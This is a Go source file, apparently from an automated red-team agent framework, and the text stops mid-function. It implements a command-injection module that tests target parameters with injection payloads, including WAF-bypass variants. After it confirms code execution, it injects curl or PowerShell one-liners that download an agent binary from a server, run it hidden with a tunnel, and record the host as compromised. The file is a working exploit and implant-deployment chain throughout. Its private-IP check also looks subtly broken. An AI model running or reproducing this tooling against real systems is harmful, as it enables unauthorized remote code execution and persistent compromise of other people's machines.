package specialist

import (
	"cal-project/internal/brain/llm"
	"cal-project/internal/brain/prompts"
	"cal-project/internal/core/agent"
	"cal-project/internal/core/bus"
	"cal-project/internal/hands/scripts"
	"cal-project/internal/hands/tools"
	"cal-project/internal/hands/trt"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"regexp"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var cmdiMessageCounter atomic.Uint64

// CommandInjectionSpecialist deploys CallistoAgent through existing agents via TRT API
type CommandInjectionSpecialist struct {
	id               string
	bus              bus.Bus
	brain            llm.LLM
	ctx              context.Context
	trtClient        *trt.Client
	agentPaw         string // Agent PAW to use for deployment
	platform         string // Platform of the agent (windows/linux)
	agentServer      string // TRT server URL for -server flag
	agentDownloadURL string // Agent binary download URL (can be different from agentServer)
	scriptLoader     *scripts.Loader
}

// NewCommandInjectionSpecialist creates a new CommandInjectionSpecialist
func NewCommandInjectionSpecialist(ctx context.Context, id string, eventBus bus.Bus, llmClient llm.LLM, trtClient *trt.Client, agentPaw string, platform string) *CommandInjectionSpecialist {
	agentServer := os.Getenv("TRT_API_URL")
	if agentServer == "" {
		agentServer = "http://192.168.50.10"
	}

	// Agent download URL can be different from TRT API URL
	// Used when test server and TRT are in same Docker network
	agentDownloadURL := os.Getenv("AGENT_DOWNLOAD_URL")
	if agentDownloadURL == "" {
		agentDownloadURL = agentServer // Fallback to TRT server
	}

	return &CommandInjectionSpecialist{
		id:               id,
		bus:              eventBus,
		brain:            llmClient,
		ctx:              ctx,
		trtClient:        trtClient,
		agentPaw:         agentPaw,
		platform:         platform,
		agentServer:      agentServer,
		agentDownloadURL: agentDownloadURL,
		scriptLoader:     scripts.NewLoader(""),
	}
}

func (c *CommandInjectionSpecialist) ID() string {
	return c.id
}

func (c *CommandInjectionSpecialist) Type() agent.AgentType {
	return agent.Specialist
}

func (c *CommandInjectionSpecialist) Run() error {
	log.Printf("[%s] Online. Agent Deployment Specialist using PAW: %s (platform: %s)\n", c.id, c.agentPaw, c.platform)
	return nil
}

func (c *CommandInjectionSpecialist) OnEvent(event bus.Event) {
	if event.Type == bus.Command && event.ToAgent == c.id {
		log.Printf("[%s] Received command: %v\n", c.id, event.Payload)
		go func() {
			defer func() {
				if rec := recover(); rec != nil {
					log.Printf("[%s] PANIC in executeTask: %v\n%s\n", c.id, rec, debug.Stack())
					c.reportError(event.FromAgent, fmt.Errorf("task panicked: %v", rec))
				}
			}()
			c.executeTask(event)
		}()
	}
}

// executeTask performs the agent deployment via TRT API
func (c *CommandInjectionSpecialist) executeTask(cmdEvent bus.Event) {
	taskDesc, ok := cmdEvent.Payload.(string)
	if !ok {
		log.Printf("[%s] Invalid task payload\n", c.id)
		return
	}

	log.Printf("[%s] Executing: %s\n", c.id, taskDesc)

	if c.trtClient == nil {
		c.reportObservation(cmdEvent.FromAgent, "Agent deployment failed: TRT Client not available")
		return
	}

	if c.agentPaw == "" {
		c.reportObservation(cmdEvent.FromAgent, "Agent deployment failed: No agent PAW specified")
		return
	}

	// ============================================================================
	// P1: Verify RCE first before deploying agent
	// ============================================================================
	targetURL, parameter := c.extractTaskInfo(taskDesc)

	if targetURL == "" || parameter == "" {
		log.Printf("[%s] ⚠️ Cannot deploy agent: missing target URL or parameter\n", c.id)
		c.reportObservation(cmdEvent.FromAgent, "Agent deployment failed: missing target URL or parameter")
		return
	}

	log.Printf("[%s] 🔥 Verifying RCE on: %s (param: %s)\n", c.id, targetURL, parameter)
	verified, payload, actualParam, payloadType := c.verifyRCE(targetURL, parameter)

	if !verified {
		log.Printf("[%s] ⚠️ RCE verification failed - aborting agent deployment\n", c.id)
		c.reportObservation(cmdEvent.FromAgent, "RCE verification failed - false positive, deployment aborted")
		return
	}

	log.Printf("[%s] ✅ RCE verified with payload: %s (param: %s, type: %s)\n", c.id, payload, actualParam, payloadType)
	evidence := fmt.Sprintf("Command execution confirmed with payload: %s (parameter: %s)", payload, actualParam)
	c.reportVerifiedRCE(targetURL, payload, evidence)

	log.Printf("[%s] Deploying CallistoAgent via Command Injection (both platforms)...\n", c.id)

	// Get current agent list before deployment
	agentsBefore, _ := c.trtClient.GetAliveAgents()
	beforePAWs := make(map[string]bool)
	for _, a := range agentsBefore {
		beforePAWs[a.Paw] = true
	}

	// ============================================================================
	// Get parent agent info and determine server address for child deployment
	// If parent has tunnel enabled, use parent's IP:tunnelPort
	// Otherwise fallback to TRT server address
	// ============================================================================
	parentAgent, err := c.getAgentByPaw(c.agentPaw)
	var serverAddr string

	if err != nil {
		log.Printf("[%s] Failed to get parent agent info: %v, using TRT server\n", c.id, err)
		serverAddr = c.agentServer // Fallback to TRT
	} else {
		// Parent Agent의 tunnel 정보 확인
		serverAddr = c.selectParentAddress(parentAgent)
		log.Printf("[%s] Using server address: %s\n", c.id, serverAddr)
	}

	// Deploy agent with appropriate server address (parent tunnel or TRT)
	results := c.deployAgentBothPlatforms(targetURL, actualParam, payloadType, serverAddr)

	// Generate report
	report := c.generateReportBothPlatforms(results)
	c.reportObservation(cmdEvent.FromAgent, report)

	// ============================================================================
	// Poll TRT for new agent registration and report Compromised if found
	// ============================================================================
	go c.pollForNewAgent(targetURL, beforePAWs)
}

// DeploymentResult stores the result of a deployment attempt
type DeploymentResult struct {
	Platform string
	Success  bool
	LinkID   string
	Error    string
}

// PayloadType indicates how the command injection works
type PayloadType string

const (
	PayloadTypeDirect   PayloadType = "direct"   // Direct command execution (e.g., command=id)
	PayloadTypeChained  PayloadType = "chained"  // Chained with separator (e.g., host=localhost;id)
)

// deployAgentBothPlatforms deploys agent for both Windows and Linux via Command Injection (PARALLEL)
// serverAddr: Parent agent address (IP:port) or TRT server URL
func (c *CommandInjectionSpecialist) deployAgentBothPlatforms(targetURL string, parameter string, payloadType PayloadType, serverAddr string) []DeploymentResult {
	results := make(chan DeploymentResult, 2)
	var wg sync.WaitGroup

	// Deploy Windows and Linux in parallel
	platforms := []string{"windows", "linux"}
	for _, platform := range platforms {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			if p == "windows" {
				log.Printf("[%s] 🪟 Attempting Windows agent deployment via Command Injection...\n", c.id)
			} else {
				log.Printf("[%s] 🐧 Attempting Linux agent deployment via Command Injection...\n", c.id)
			}
			result := c.deployAgentViaRCE(targetURL, parameter, p, payloadType, serverAddr)
			results <- result
		}(platform)
	}

	// Wait for both deployments to complete
	go func() {
		wg.Wait()
		close(results)
	}()

	// Collect results
	var deployResults []DeploymentResult
	for result := range results {
		deployResults = append(deployResults, result)
	}

	return deployResults
}

// deployAgentViaRCE deploys CallistoAgent via Command Injection vulnerability
// Uses Native HTTP Client to avoid URL encoding issues through TRT Remote Executor
// serverAddr: Parent agent address (IP:port) or TRT server URL
func (c *CommandInjectionSpecialist) deployAgentViaRCE(targetURL string, parameter string, platform string, payloadType PayloadType, serverAddr string) DeploymentResult {
	result := DeploymentResult{
		Platform: platform,
		Success:  false,
	}

	// Build agent URL (use agentDownloadURL for Docker network compatibility)
	agentURL := fmt.Sprintf("%s/agents/%s", c.agentDownloadURL, platform)

	// Get default agent path
	agentPath := scripts.GetDefaultAgentPath(platform)

	log.Printf("[%s] Preparing %s agent deployment via RCE\n", c.id, platform)
	log.Printf("[%s] Agent URL: %s\n", c.id, agentURL)
	log.Printf("[%s] Agent Path: %s\n", c.id, agentPath)
	log.Printf("[%s] Server Address: %s\n", c.id, serverAddr)

	// Generate random tunnel port for root/admin agents
	newTunnelPort := 5000 + rand.Intn(1000)

	// Ensure serverAddr has http:// protocol for Callisto Agent
	if !strings.HasPrefix(serverAddr, "http://") && !strings.HasPrefix(serverAddr, "https://") {
		serverAddr = "http://" + serverAddr
	}

	// Generate one-liner deployment command with privilege check and conditional tunnelPort
	var deployCommand string
	if strings.ToLower(platform) == "windows" {
		// Windows: PowerShell with admin check + conditional tunnelPort
		deployCommand = fmt.Sprintf(`powershell -c "IWR -Uri %s -OutFile %s -UseBasicParsing; $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if ($isAdmin) { Start-Process %s -ArgumentList '-server %s -tunnelPort %d' -WindowStyle Hidden } else { Start-Process %s -ArgumentList '-server %s' -WindowStyle Hidden }"`,
			agentURL, agentPath, agentPath, serverAddr, newTunnelPort, agentPath, serverAddr)
	} else {
		// Linux: curl + root check + conditional tunnelPort
		deployCommand = fmt.Sprintf(`curl -s -o %s %s && chmod +x %s && if [ $(id -u) -eq 0 ]; then nohup %s -server %s -tunnelPort %d > /dev/null 2>&1 & else nohup %s -server %s > /dev/null 2>&1 & fi`,
			agentPath, agentURL, agentPath, agentPath, serverAddr, newTunnelPort, agentPath, serverAddr)
	}

	log.Printf("[%s] Deployment command: %s\n", c.id, deployCommand)

	// Build Command Injection payload based on payloadType
	var payload string
	if payloadType == PayloadTypeDirect {
		// Direct command execution - no prefix needed
		payload = deployCommand
		log.Printf("[%s] Using DIRECT payload (no prefix)\n", c.id)
	} else {
		// Chained payload - add separator prefix
		if strings.ToLower(platform) == "windows" {
			payload = fmt.Sprintf("& %s", deployCommand)
		} else {
			payload = fmt.Sprintf("; %s", deployCommand)
		}
		log.Printf("[%s] Using CHAINED payload (with separator)\n", c.id)
	}

	log.Printf("[%s] Executing deployment via Command Injection...\n", c.id)
	log.Printf("[%s] Payload: %s\n", c.id, payload)

	// ============================================================================
	// Use Native HTTP Client to avoid URL encoding corruption via TRT Remote Executor
	// The TRT executor uses Windows Agent's curl which mangles special characters
	// ============================================================================

	// Build the full URL with properly encoded payload
	// We manually construct the URL to ensure correct encoding
	fullURL := fmt.Sprintf("%s?%s=%s", targetURL, parameter, url.QueryEscape(payload))

	log.Printf("[%s] Sending deployment request via Native HTTP Client\n", c.id)
	log.Printf("[%s] Full URL: %s\n", c.id, fullURL)

	// Execute HTTP request using Native Go HTTP Client (bypasses TRT Remote Executor)
	response, err := tools.NativeHTTPGet(c.ctx, fullURL, "")
	if err != nil {
		log.Printf("[%s] Native HTTP request failed: %v\n", c.id, err)
		result.Error = fmt.Sprintf("HTTP request failed: %v", err)
		return result
	}

	log.Printf("[%s] HTTP response received (%d bytes)\n", c.id, len(response))

	// Consider it successful if request went through
	// The agent will beacon to TRT if deployment succeeded
	result.Success = true
	result.LinkID = fmt.Sprintf("rce-%s-%s", platform, time.Now().Format("20060102-150405"))

	log.Printf("[%s] ✅ Deployment command sent via RCE for %s\n", c.id, platform)
	log.Printf("[%s] Note: Check TRT for new agent beacon\n", c.id)

	return result
}

// waitForResult polls for command execution result
func (c *CommandInjectionSpecialist) waitForResult(linkID string, timeout time.Duration) (*trt.CommandResult, error) {
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		result, err := c.trtClient.GetCommandResult(linkID)
		if err != nil {
			log.Printf("[%s] Error polling result: %v\n", c.id, err)
			time.Sleep(2 * time.Second)
			continue
		}

		if result != nil {
			return result, nil
		}

		time.Sleep(2 * time.Second)
	}

	return nil, fmt.Errorf("timeout waiting for result")
}

// getFallbackScript returns an inline deployment script when loader fails
func (c *CommandInjectionSpecialist) getFallbackScript(agentURL, agentPath string, platform string) string {
	if strings.ToLower(platform) == "windows" {
		return fmt.Sprintf(`$agentUrl = "%s"
$agentPath = "%s"
Invoke-WebRequest -Uri $agentUrl -OutFile $agentPath -UseBasicParsing
Start-Process -FilePath $agentPath -WindowStyle Hidden`, agentURL, agentPath)
	}

	// Linux fallback
	return fmt.Sprintf(`AGENT_URL="%s"
AGENT_PATH="%s"
curl -s -o "$AGENT_PATH" "$AGENT_URL" || wget -q -O "$AGENT_PATH" "$AGENT_URL"
chmod +x "$AGENT_PATH"
nohup "$AGENT_PATH" > /dev/null 2>&1 &`, agentURL, agentPath)
}

// generateReportBothPlatforms generates a report for both platform deployments
func (c *CommandInjectionSpecialist) generateReportBothPlatforms(results []DeploymentResult) string {
	report := "=== AGENT DEPLOYMENT REPORT (Both Platforms) ===\n\n"
	report += fmt.Sprintf("Agent PAW: %s\n", c.agentPaw)
	report += fmt.Sprintf("Agent Server: %s\n\n", c.agentServer)

	for i, result := range results {
		report += fmt.Sprintf("--- Platform %d: %s ---\n", i+1, strings.ToUpper(result.Platform))

		if result.Success {
			report += "Status: ✅ DEPLOYMENT COMMAND SENT\n"
			if result.LinkID != "" {
				report += fmt.Sprintf("Link ID: %s\n", result.LinkID)
			}
		} else {
			report += "Status: ❌ DEPLOYMENT FAILED\n"
			if result.Error != "" {
				report += fmt.Sprintf("Error: %s\n", result.Error)
			}
		}
		report += "\n"
	}

	report += "Note: Check TRT for new agent registration\n"
	report += "The new agent should beacon within 10 seconds if deployment was successful.\n"
	report += "One of the two platforms (Windows/Linux) should succeed based on the target OS.\n"

	return report
}

func (c *CommandInjectionSpecialist) generateReport(success bool, linkID string) string {
	report := "=== AGENT DEPLOYMENT REPORT ===\n\n"
	report += fmt.Sprintf("Agent PAW: %s\n", c.agentPaw)
	report += fmt.Sprintf("Platform: %s\n", c.platform)
	report += fmt.Sprintf("Agent Server: %s\n\n", c.agentServer)

	if success {
		report += "--- Deployment Status ---\n"
		report += "Status: DEPLOYMENT COMMAND SENT\n"
		if linkID != "" {
			report += fmt.Sprintf("Link ID: %s\n", linkID)
		}
		report += "\nNote: Check TRT for new agent registration\n"
		report += "The new agent should beacon within 10 seconds if deployment was successful.\n"
	} else {
		report += "--- Deployment Status ---\n"
		report += "Status: DEPLOYMENT FAILED\n"
		report += "Reason: Could not execute deployment command via TRT API\n"
	}

	return report
}

func (c *CommandInjectionSpecialist) reportObservation(toAgent string, observation string) {
	msgID := cmdiMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-obs-%d", c.id, msgID),
		FromAgent: c.id,
		ToAgent:   toAgent,
		Type:      bus.Observation,
		Payload:   observation,
	}
	c.bus.Publish(toAgent, event)
}

func (c *CommandInjectionSpecialist) reportError(toAgent string, err error) {
	msgID := cmdiMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-err-%d", c.id, msgID),
		FromAgent: c.id,
		ToAgent:   toAgent,
		Type:      bus.Error,
		Payload:   err.Error(),
	}
	c.bus.Publish(toAgent, event)
}

// ============================================================================
// RCE Verification Functions (P1 Implementation)
// ============================================================================

// extractTaskInfo parses task description to extract target URL and parameter
// Expected format: "Deploy ... (target context: http://example.com?cmd=test)"
func (c *CommandInjectionSpecialist) extractTaskInfo(taskDesc string) (targetURL string, parameter string) {
	// Extract URL from "target context: URL"
	re := regexp.MustCompile(`target context:\s*([^\s)]+)`)
	matches := re.FindStringSubmatch(taskDesc)
	if len(matches) < 2 {
		return "", ""
	}

	fullURL := matches[1]

	// Parse URL to extract parameter
	parsedURL, err := url.Parse(fullURL)
	if err != nil {
		log.Printf("[%s] Failed to parse URL: %v\n", c.id, err)
		return "", ""
	}

	// Get query parameters
	queryParams := parsedURL.Query()
	for param := range queryParams {
		// Return base URL and first parameter found
		baseURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, parsedURL.Path)
		return baseURL, param
	}

	return fullURL, ""
}

// verifyRCE attempts to verify command injection by executing test commands
// Returns (success, payload, actualParam, payloadType) if RCE is confirmed
func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter string) (bool, string, string, PayloadType) {
	log.Printf("[%s] 🔥 Verifying RCE on: %s (param: %s)\n", c.id, targetURL, parameter)

	// Common Command Injection parameter names to test
	commonParams := []string{
		"command", "cmd", "exec", "execute", "system", "host", "ip", "ping",
	}

	// Direct command parameters (no separator needed)
	directParams := map[string]bool{
		"command": true, "cmd": true, "exec": true, "execute": true, "system": true,
	}

	// If parameter is generic/unknown/multi-value, only test common params
	// Otherwise, try the provided parameter first
	var paramsToTest []string
	lowerParam := strings.ToLower(parameter)
	isGeneric := strings.Contains(parameter, " ") ||
		strings.Contains(parameter, "/") ||  // Multiple params like "command/ip"
		strings.Contains(parameter, ",") ||  // Multiple params like "username, password"
		strings.Contains(parameter, "(") ||  // Descriptions with parentheses like "TBD (URL parameter)"
		lowerParam == "unknown" ||
		lowerParam == "tbd" ||  // "To Be Determined"
		lowerParam == "" ||
		strings.Contains(lowerParam, "query") ||  // Generic descriptions like "URL query"
		strings.Contains(lowerParam, "input") ||  // Generic descriptions like "form input"
		strings.Contains(lowerParam, "parameter")  // Generic descriptions

	if isGeneric {
		// Generic parameter - only test common names
		paramsToTest = commonParams
		log.Printf("[%s] Parameter '%s' looks generic, testing common parameter names\n", c.id, parameter)
	} else {
		// Specific parameter - try it first, then common names
		paramsToTest = append([]string{parameter}, commonParams...)
		log.Printf("[%s] Testing specific parameter '%s' first, then common names\n", c.id, parameter)
	}

	// ============================================================================
	// Use NativeExecutor to avoid URL encoding issues via TRT Remote Executor
	// This ensures proper handling of special characters in payloads
	// ============================================================================
	executor := tools.NewNativeExecutor()
	log.Printf("[%s] Using NativeExecutor for RCE verification (bypasses TRT encoding issues)\n", c.id)

	// Test each parameter name
	for _, param := range paramsToTest {
		log.Printf("[%s] 🔍 Testing parameter: %s\n", c.id, param)

		// Determine if this is a direct command parameter
		isDirect := directParams[strings.ToLower(param)]

		// Build payloads based on parameter type
		var payloads []string
		var payloadTypes []PayloadType

		if isDirect {
			// Direct command parameters - test without separator first
			if strings.ToLower(c.platform) == "windows" {
				payloads = []string{
					"whoami",
					"& whoami",
					"| whoami",
					// WAF bypass - URL encoding
					"&%20whoami",
					// WAF bypass - Caret escape
					"& who^ami",
					// WAF bypass - Explicit cmd
					"& cmd /c whoami",
				}
				payloadTypes = []PayloadType{PayloadTypeDirect, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
			} else {
				payloads = []string{
					"id",
					"whoami",
					"; id",
					"| id",
					// WAF bypass - URL encoding
					";%20id",
					// WAF bypass - Quote escape
					"; wh''oami",
					// WAF bypass - Command substitution
					"; $(echo whoami)",
				}
				payloadTypes = []PayloadType{PayloadTypeDirect, PayloadTypeDirect, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
			}
		} else {
			// Chained parameters (e.g., host for ping injection)
			if strings.ToLower(c.platform) == "windows" {
				payloads = []string{
					"& whoami",
					"| whoami",
					"&& whoami",
					"; whoami",
					// WAF bypass variants
					"&%20whoami",
					"& cmd /c whoami",
				}
				payloadTypes = []PayloadType{PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
			} else {
				payloads = []string{
					"; id",
					"| id",
					"&& id",
					"$(id)",
					"`id`",
					// WAF bypass variants
					";%20id",
					"; wh''oami",
				}
				payloadTypes = []PayloadType{PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
			}
		}

		for i, payload := range payloads {
			log.Printf("[%s] Testing payload: %s (type: %s)\n", c.id, payload, payloadTypes[i])

			// Build test URL
			testURL, err := url.Parse(targetURL)
			if err != nil {
				log.Printf("[%s] Failed to parse URL: %v\n", c.id, err)
				continue
			}

			queryParams := testURL.Query()
			queryParams.Set(param, payload)
			testURL.RawQuery = queryParams.Encode()

			// Execute HTTP request
			response, err := tools.SimpleHTTPGet(c.ctx, executor, testURL.String())
			if err != nil {
				log.Printf("[%s] HTTP request failed: %v\n", c.id, err)
				continue
			}

			// Extract HTTP body from response (skip headers from curl -i)
			httpBody := extractHTTPBody(response)
			lowerBody := strings.ToLower(httpBody)

			// Check for command execution indicators in HTTP body only
			// Avoid false positives from Windows Agent's curl output (e.g., "E:\business\...")
			isRCESuccess := false

			// Linux indicators
			if strings.Contains(lowerBody, "uid=") && strings.Contains(lowerBody, "gid=") {
				isRCESuccess = true
				log.Printf("[%s] RCE indicator: uid=/gid= found\n", c.id)
			} else if strings.Contains(lowerBody, "root") && !strings.Contains(lowerBody, "error") {
				// "root" but not in error messages
				isRCESuccess = true
				log.Printf("[%s] RCE indicator: 'root' found\n", c.id)
			} else if strings.Contains(lowerBody, "www-data") {
				isRCESuccess = true
				log.Printf("[%s] RCE indicator: 'www-data' found\n", c.id)
			}

			// Windows indicators - must be in HTML output section, not curl headers
			if strings.Contains(lowerBody, "nt authority") {
				isRCESuccess = true
				log.Printf("[%s] RCE indicator: 'nt authority' found\n", c.id)
			}

			if isRCESuccess {
				log.Printf("[%s] ✅ RCE verified! Response body: %s\n", c.id, httpBody[:min(200, len(httpBody))])
				log.Printf("[%s] ✅ Working parameter: %s (type: %s)\n", c.id, param, payloadTypes[i])
				return true, payload, param, payloadTypes[i]
			}
		}
	}

	return false, "", "", PayloadTypeChained
}

// extractHTTPBody extracts the body from HTTP response (skips headers)
// This is needed because TRT Remote Executor returns full curl -i output
func extractHTTPBody(response string) string {
	// Look for double newline (end of headers)
	if idx := strings.Index(response, "\r\n\r\n"); idx != -1 {
		return response[idx+4:]
	}
	if idx := strings.Index(response, "\n\n"); idx != -1 {
		return response[idx+2:]
	}
	// If no headers found, return as-is
	return response
}

// reportVerifiedRCE publishes a Finding event to Reporter
func (c *CommandInjectionSpecialist) reportVerifiedRCE(targetURL string, payload string, evidence string) {
	finding := map[string]interface{}{
		"type":        "CommandInjection",
		"url":         targetURL,
		"payload":     payload,
		"severity":    "High",
		"description": fmt.Sprintf("Verified CommandInjection vulnerability. \nEvidence: %s", evidence),
		"timestamp":   time.Now().Format(time.RFC1123),
	}

	msgID := cmdiMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-finding-%d", c.id, msgID),
		FromAgent: c.id,
		ToAgent:   "BROADCAST",
		Type:      bus.Finding,
		Payload:   finding,
	}
	c.bus.Publish("Reporter-01", event)

	log.Printf("[%s] ✅ Verified RCE: CommandInjection at %s\n", c.id, targetURL)
}

// pollForNewAgent waits for new agent registration and reports Compromised event
func (c *CommandInjectionSpecialist) pollForNewAgent(targetURL string, beforePAWs map[string]bool) {
	// Wait up to 30 seconds for new agent registration
	maxAttempts := 15
	pollInterval := 2 * time.Second

	log.Printf("[%s] 🔍 Polling TRT for new agent registration...\n", c.id)

	for attempt := 1; attempt <= maxAttempts; attempt++ {
		time.Sleep(pollInterval)

		agents, err := c.trtClient.GetAliveAgents()
		if err != nil {
			log.Printf("[%s] Error polling agents: %v\n", c.id, err)
			continue
		}

		// Check for new agents
		for _, agent := range agents {
			if !beforePAWs[agent.Paw] {
				// Found new agent!
				log.Printf("[%s] 💀 NEW AGENT DETECTED: %s (Host: %s, Platform: %s, User: %s)\n",
					c.id, agent.Paw, agent.Host, agent.Platform, "")

				// Report Compromised event to Reporter
				c.reportCompromised(targetURL, agent)
				return
			}
		}

		if attempt%5 == 0 {
			log.Printf("[%s] Still waiting for new agent... (%d/%d)\n", c.id, attempt, maxAttempts)
		}
	}

	log.Printf("[%s] ⚠️ No new agent detected after 30 seconds. Deployment may have failed.\n", c.id)
}

// reportCompromised publishes a Compromised event to Reporter and creates NetworkNode in TRT
func (c *CommandInjectionSpecialist) reportCompromised(targetURL string, agent trt.Agent) {
	// Use privilege from TRT if available, otherwise infer
	privilege := agent.Privilege
	if privilege == "" {
		privilege = "User"
		// Infer from username
		lowerUser := strings.ToLower(agent.Username)
		if strings.Contains(lowerUser, "root") ||
			strings.Contains(lowerUser, "system") ||
			strings.Contains(lowerUser, "admin") ||
			strings.Contains(lowerUser, "nt authority") {
			privilege = "Elevated"
		}
	}

	// Use username from TRT if available, otherwise use host
	username := agent.Username
	if username == "" {
		username = agent.Host
	}

	// ============================================================================
	// Create NetworkNode in TRT for the compromised target
	// First check if a node already exists using hostname-based lookup
	// This handles Docker IP mismatch (127.0.0.1 vs 172.x.x.x)
	// ============================================================================
	if c.trtClient != nil {
		// Use agent's IP from HostIPAddrs (not Host which is container hostname)
		// Parse host_ip_addrs to get actual IP address
		agentIPs := c.parseHostIPAddrs(agent.HostIPAddrs)
		var ipAddress string
		if len(agentIPs) > 0 {
			ipAddress = agentIPs[0] // Use first IP
		} else {
			ipAddress = agent.Host // Fallback to Host if no IPs available
		}
		hostname := agent.Host // Use actual hostname (e.g., container name)
		if hostname == "" || hostname == ipAddress {
			hostname = fmt.Sprintf("Compromised-%s", agent.Paw)
		}
		role := "COMPROMISED"

		// ============================================================================
		// Check for existing node using hostname-based lookup (deduplication)
		// This prevents duplicate nodes for localhost/127.0.0.1/172.x.x.x
		// ============================================================================
		existingNode, err := c.trtClient.GetNetworkNodeByHostnameOrIP(hostname)
		if err != nil {
			log.Printf("[%s] ⚠️ Error checking existing node: %v\n", c.id, err)
		}
		if existingNode == nil && ipAddress != hostname {
			// Also check by IP address
			existingNode, err = c.trtClient.GetNetworkNodeByHostnameOrIP(ipAddress)
			if err != nil {
				log.Printf("[%s] ⚠️ Error checking existing node by IP: %v\n", c.id, err)
			}
		}

		if existingNode != nil {
			log.Printf("[%s] 🔗 Found existing NetworkNode: ID=%d, IP=%s, Hostname=%s (skipping duplicate creation)\n",
				c.id, existingNode.ID, existingNode.IPAddress, existingNode.Hostname)
			// Use existing node instead of creating a new one
		} else {
			// Find source NetworkNode from the original agent's IP addresses
			var sourceNodeID int
			sourceAgent, err := c.getAgentByPaw(c.agentPaw)
			if err == nil && sourceAgent != nil {
				// Parse host_ip_addrs JSON array to find matching NetworkNode
				sourceIPs := c.parseHostIPAddrs(sourceAgent.HostIPAddrs)
				for _, sourceIP := range sourceIPs {
					sourceNode, err := c.trtClient.GetNetworkNodeByHostnameOrIP(sourceIP)
					if err == nil && sourceNode != nil {
						sourceNodeID = sourceNode.ID
						log.Printf("[%s] 🔗 Found source NetworkNode: ID=%d, IP=%s\n", c.id, sourceNode.ID, sourceIP)
						break
					}
				}
			}

			// Create NetworkNode with sourceNodeID for edge creation
			var node *trt.NetworkNode
			if sourceNodeID > 0 {
				node, err = c.trtClient.CreateNetworkNode(ipAddress, hostname, role, agent.Platform, true, sourceNodeID)
			} else {
				node, err = c.trtClient.CreateNetworkNode(ipAddress, hostname, role, agent.Platform, true)
			}
			if err != nil {
				log.Printf("[%s] ⚠️ Failed to create NetworkNode for %s: %v\n", c.id, ipAddress, err)
			} else {
				log.Printf("[%s] 🌐 NetworkNode created: ID=%d, IP=%s, Role=%s, SourceNodeID=%d\n", c.id, node.ID, node.IPAddress, node.Role, sourceNodeID)
			}
		}
	}

	compromised := map[string]interface{}{
		"url":       targetURL,
		"agent_paw": agent.Paw,
		"platform":  agent.Platform,
		"host":      agent.Host,
		"username":  username,
		"privilege": privilege,
		"timestamp": time.Now().Format(time.RFC1123),
	}

	msgID := cmdiMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-compromised-%d", c.id, msgID),
		FromAgent: c.id,
		ToAgent:   "Reporter-01",
		Type:      bus.Compromised,
		Payload:   compromised,
	}
	c.bus.Publish("Reporter-01", event)

	log.Printf("[%s] 💀 COMPROMISED: Target %s now has active agent %s\n", c.id, targetURL, agent.Paw)
}

// getAgentByPaw retrieves an agent by its PAW identifier
func (c *CommandInjectionSpecialist) getAgentByPaw(paw string) (*trt.Agent, error) {
	if c.trtClient == nil {
		return nil, fmt.Errorf("TRT client not available")
	}

	agents, err := c.trtClient.GetAliveAgents()
	if err != nil {
		return nil, err
	}

	for _, agent := range agents {
		if agent.Paw == paw {
			return &agent, nil
		}
	}

	return nil, fmt.Errorf("agent not found: %s", paw)
}

// parseHostIPAddrs parses the JSON array string of host IP addresses
// e.g., "[\"192.168.1.1\", \"10.0.0.1\"]" -> ["192.168.1.1", "10.0.0.1"]
func (c *CommandInjectionSpecialist) parseHostIPAddrs(jsonStr string) []string {
	if jsonStr == "" {
		return nil
	}

	var ips []string
	// Remove brackets and quotes, split by comma
	jsonStr = strings.TrimPrefix(jsonStr, "[")
	jsonStr = strings.TrimSuffix(jsonStr, "]")
	jsonStr = strings.ReplaceAll(jsonStr, "\"", "")
	jsonStr = strings.ReplaceAll(jsonStr, " ", "")

	if jsonStr == "" {
		return nil
	}

	parts := strings.Split(jsonStr, ",")
	for _, part := range parts {
		ip := strings.TrimSpace(part)
		if ip != "" && ip != "UNKNOWN" {
			ips = append(ips, ip)
		}
	}

	return ips
}

// selectParentAddress selects the best IP address from parent agent for tunneling
// Priority: Private IP > Public IP > Fallback to TRT server
func (c *CommandInjectionSpecialist) selectParentAddress(agent *trt.Agent) string {
	// Convert TunnelPort string to int
	tunnelPort, err := strconv.Atoi(agent.TunnelPort)
	if err != nil || tunnelPort <= 0 {
		log.Printf("[selectParentAddress] Parent agent has no tunnel (port=%s), using TRT server: %s", agent.TunnelPort, c.agentServer)
		return c.agentServer
	}

	// Parse IP addresses
	ips := c.parseHostIPAddrs(agent.HostIPAddrs)
	if len(ips) == 0 {
		log.Printf("[selectParentAddress] No IPs found for agent %s, using TRT server: %s", agent.Paw, c.agentServer)
		return c.agentServer
	}

	// Helper function to check if IP is private
	isPrivateIP := func(ip string) bool {
		// Parse IP
		parsed := net.ParseIP(ip)
		if parsed == nil {
			return false
		}

		// Check private ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
		if parsed.IsLoopback() {
			return true
		}

		// 10.0.0.0/8
		if parsed[0] == 10 {
			return true
		}

		// 172.16.0.0/12
		if parsed[0] == 172 && parsed[1] >= 16 && parsed[1] <= 31 {
			return true
		}

		// 192.168.0.0/16
		if parsed[0] == 192 && parsed[1] == 168 {
			return true
		}

		return false
	}

	// First, try to find a private IP
	for _, ip := range ips {
		if isPrivateIP(ip) {
			serverAddr := fmt.Sprintf("%s:%d", ip, tunnelPort)
			log.Printf("[selectParentAddress] Selected private IP: %s", serverAddr)
			return serverAddr
		}
	}

